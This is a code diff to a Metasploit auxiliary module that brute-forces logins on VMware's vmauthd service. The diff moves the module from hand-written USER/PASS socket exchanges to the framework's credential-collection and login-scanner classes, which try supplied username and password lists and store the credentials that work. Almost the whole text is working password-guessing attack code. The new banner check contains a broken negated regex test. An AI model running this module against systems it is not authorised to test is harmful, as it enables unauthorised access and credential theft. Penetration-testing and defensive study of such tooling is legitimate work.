@@ -4,6 +4,8 @@
 ##
 
 require 'msf/core/exploit/tcp'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/vmauthd'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -33,103 +35,91 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
+    print_status("#{ip}:#{rport} - Starting vmauthd login attempts")
+
+    # Peform a sanity check to ensure that our target is vmauthd before
+    # attempting to brute force it.
     begin
-
-    connect rescue nil
-    if not self.sock
-      print_error "#{rhost}:#{rport} Could not connect to vmauthd"
-      return
-    end
-
-    banner = sock.get_once(-1, 10)
-    if not banner
-      print_error "#{rhost}:#{rport} No banner received from vmauthd"
-      return
-    end
-
-    banner = banner.strip
-    print_status "#{rhost}:#{rport} Banner: #{banner}"
-
-    unless banner =~ /VMware Authentication Daemon/
-      print_error "#{rhost}:#{rport} This does not appear to be a vmauthd service"
-      return
-    end
-
-    if banner =~ /SSL/
-      print_status("#{rhost}:#{rport} Switching to SSL connection...")
-      swap_sock_plain_to_ssl
-    end
-
-    each_user_pass do |user, pass|
-      result = do_login(user, pass)
-      case result
-      when :failed
-        print_error("#{rhost}:#{rport} vmauthd login FAILED - #{user}:#{pass}")
-      when :success
-        print_good("#{rhost}:#{rport} vmauthd login SUCCESS - #{user}:#{pass}")
-        report_auth_info(
-          :host   => rhost,
-          :port   => rport,
-          :sname  => 'vmauthd',
-          :user   => user,
-          :pass   => pass,
-          :source_type => "user_supplied",
-          :active => true
-        )
-        return if datastore['STOP_ON_SUCCESS']
-      else
-        print_error("#{rhost}:#{rport} Error: #{result}")
+      connect rescue nil
+      if !self.sock
+        print_error "#{ip}:#{rport} - Could not connect to vmauthd"
+        return
       end
-    end
+      banner = sock.get_once(-1, 10)
+      if !banner || !banner =~ /^220 VMware Authentication Daemon Version.*/
+        print_error "#{ip}:#{rport} - Target does not appear to be a vmauthd service"
+        return
+      end
 
-    rescue ::Interrupt
-      raise $!
+      rescue ::Interrupt
+      raise $ERROR_INFO
     ensure
       disconnect
     end
 
-  end
+    cred_collection = Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
+      password: datastore['PASSWORD'],
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS']
+    )
+    scanner = Metasploit::Framework::LoginScanner::VMAUTHD.new(
+      host: ip,
+      port: rport,
+      proxies: datastore['PROXIES'],
+      cred_details: cred_collection,
+      stop_on_success: datastore['STOP_ON_SUCCESS'],
+      connection_timeout: 30
+    )
 
-  def do_login(user, pass, nsock=self.sock)
-    nsock.put("USER #{user}\r\n")
-    res = nsock.get_once
-    unless res.start_with? "331"
-      ret_msg = "Unexpected reply to the USER command: #{res}"
-      return ret_msg
+    service_data = {
+      address: ip,
+      port: rport,
+      service_name: 'vmauthd',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    scanner.scan! do |result|
+      if result.success?
+        credential_data = {
+          module_fullname: self.fullname,
+          origin_type: :service,
+          private_data: result.credential.private,
+          private_type: :password,
+          username: result.credential.public
+        }
+        credential_data.merge!(service_data)
+
+        credential_core = create_credential(credential_data)
+
+        login_data = {
+          core: credential_core,
+          last_attempted_at: DateTime.now,
+          status: Metasploit::Model::Login::Status::SUCCESSFUL
+        }
+
+        login_data.merge!(service_data)
+
+        create_credential_login(login_data)
+
+        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
+      else
+        invalidate_login(
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: nil,
+          realm_value: nil,
+          status: result.status)
+        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof.strip})"
+      end
     end
-    nsock.put("PASS #{pass}\r\n")
-    res = nsock.get_once || ''
-    if res.start_with? "530"
-      return :failed
-    elsif res.start_with? "230"
-      return :success
-    else
-      ret_msg = "Unexpected reply to the PASS command: #{res}"
-      return ret_msg
-    end
+
   end
-
-  def swap_sock_plain_to_ssl(nsock=self.sock)
-    ctx =  generate_ssl_context()
-    ssl = OpenSSL::SSL::SSLSocket.new(nsock, ctx)
-
-    ssl.connect
-
-    nsock.extend(Rex::Socket::SslTcp)
-    nsock.sslsock = ssl
-    nsock.sslctx  = ctx
-  end
-
-  def generate_ssl_context
-    ctx = OpenSSL::SSL::SSLContext.new(:SSLv3)
-    @@cached_rsa_key ||= OpenSSL::PKey::RSA.new(1024){ }
-
-    ctx.key = @@cached_rsa_key
-
-    ctx.session_id_context = Rex::Text.rand_text(16)
-
-    return ctx
-  end
-
-
 end
